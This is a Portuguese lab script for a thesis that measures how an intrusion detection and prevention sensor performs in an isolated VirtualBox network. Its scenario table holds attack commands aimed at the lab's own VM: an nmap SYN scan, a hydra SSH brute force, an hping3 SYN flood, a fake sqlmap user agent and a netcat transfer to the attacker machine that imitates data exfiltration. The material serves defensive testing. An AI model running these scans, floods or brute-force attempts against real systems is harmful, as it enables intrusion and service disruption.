# Roteiro de experimentos (laboratório isolado)

Objetivo: gerar os dados do capítulo de resultados, comparando o modo
`detection` e o modo `prevention` com os MESMOS cenários.

> Execute apenas no seu laboratório (rede interna do VirtualBox), contra as
> suas próprias VMs. Nunca contra redes ou máquinas de terceiros.

## Topologia

| VM | Papel | IP de exemplo |
|----|-------|---------------|
| Ubuntu Server | alvo + sensor (roda `main.py`) | 192.168.56.10 |
| Kali | atacante | 192.168.56.20 |
| (opcional) 2º IP no Kali ou o host | usuário legítimo | 192.168.56.30 |

Para o tráfego legítimo, use um IP DIFERENTE do atacante e que NÃO esteja
na `whitelist_ips` (senão não há como medir falso positivo). Num Kali único:
`sudo ip addr add 192.168.56.30/24 dev eth0` e use `curl --interface 192.168.56.30`.

No Ubuntu, instale o serviço SSH/HTTP que serão alvo:
`sudo apt install -y openssh-server apache2`.

## Preparação

1. Ajuste `config.yaml` (`interface`, `protected_ips`, limiares).
2. Sincronize os relógios (as marcações são feitas no sensor, então só o
   relógio do sensor importa para a análise).
3. Mantenha uma janela de terminal para o sensor e outra para marcações.

## Procedimento por execução

No sensor (terminal A): `sudo venv/bin/python3 main.py`

Para cada cenário, no sensor (terminal B):

```bash
python3 evaluation/mark.py begin <cenario> <malicious|legit> <ip_de_origem>
```

...execute o tráfego do cenário (veja abaixo)... e então:

```bash
python3 evaluation/mark.py end <cenario>
```

Espere ~`alert_cooldown_seconds` entre execuções do mesmo cenário (ou
reinicie o sensor) para que o cooldown não esconda a detecção seguinte.
No modo `prevention`, o bloqueio dura `block_duration_seconds`: reinicie o
sensor entre execuções (o `cleanup()` remove as regras ao encerrar) ou use
um valor curto no config durante os testes.

## Cenários

| Nome | Tipo | Origem | Comando (na VM de origem) |
|------|------|--------|---------------------------|
| `port_scan` | malicious | Kali | `nmap -sS -p 1-1000 192.168.56.10` |
| `brute_force_ssh` | malicious | Kali | `hydra -l <usuario_do_lab> -P <lista_pequena.txt> ssh://192.168.56.10` |
| `flood_syn` | malicious | Kali | `sudo hping3 -S -p 80 -i u2000 -c 3000 192.168.56.10` (taxa moderada) |
| `tool_signature` | malicious | Kali | `curl -A "sqlmap/1.7" http://192.168.56.10/` |
| `exfiltration` | malicious | alvo → Kali | no alvo: `dd if=/dev/urandom bs=1M count=20 \| nc 192.168.56.20 9000` (com `nc -l -p 9000 > /dev/null` no Kali) |
| `web_normal` | legit | 2º IP | `for i in $(seq 1 30); do curl -s -o /dev/null --interface 192.168.56.30 http://192.168.56.10/; sleep 0.3; done` |
| `ssh_normal` | legit | 2º IP | login SSH normal (poucas conexões) |
| `download_normal` | legit | 2º IP | `curl --interface 192.168.56.30 -o /dev/null http://192.168.56.10/arquivo_grande` |

Notas:
- Em `exfiltration` o `src_ip` do gabarito é o IP do alvo (192.168.56.10),
  porque é o host protegido que envia os dados.
- O IP legítimo precisa gerar tráfego "normal" de verdade. Se você incluir
  cenários legítimos agressivos (ex.: 200 requisições em 1 s), vai medir um
  falso positivo real — esse é justamente o dado interessante para o TCC.

## Repetições

Repita cada cenário pelo menos 10 vezes em cada modo. Rode o bloco inteiro
com `mode: detection`, depois troque para `mode: prevention` e repita.
Cada início do `main.py` grava `session_start` com o modo, e é isso que a
análise usa para separar os resultados.

## Resultados

```bash
python3 evaluation/analyze.py
```

Gera a tabela por execução, o resumo por modo (taxa de detecção, tempo até
a detecção, bloqueios, falsos positivos, tráfego legítimo bloqueado) e o
arquivo `evaluation/resultados.csv`, que pode virar tabelas e gráficos no
capítulo de avaliação.

## Experimento extra (recomendado): sensibilidade dos limiares

Repita `port_scan` e `web_normal` variando `port_scan_threshold` (ex.: 5, 15,
50) e registre detecção × falsos positivos. Isso sustenta a discussão do
trade-off (Axelsson, 2000a) com dados seus.
